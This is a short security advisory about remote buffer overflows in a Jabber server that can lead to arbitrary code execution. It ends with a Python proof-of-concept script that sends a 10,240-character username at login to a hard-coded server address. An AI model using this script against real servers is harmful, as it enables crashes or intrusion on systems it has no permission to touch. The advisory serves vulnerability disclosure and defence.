source: http://www.securityfocus.com/bid/11741/info

Multiple remote buffer overflow vulnerabilities affect the Jabber Server. These issues are due to a failure of the application to properly validate the length of user-supplied strings prior to copying them into finite process buffers.

An attacker may leverage these issues to execute arbitrary code on a computer with the privileges of the server process. This may facilitate unauthorized access or privilege escalation.

#!/usr/bin/python
import xmpp
name = 'a'*10240
# Born a client
cl=xmpp.Client('localhost')
if not cl.connect(server=('192.168.10.138',5222)):
raise IOError('Can not connect to server.') 
if not cl.auth(name,'jabberuserpassword','optional resource name'):
raise IOError('Can not auth with server.')
cl.disconnect()
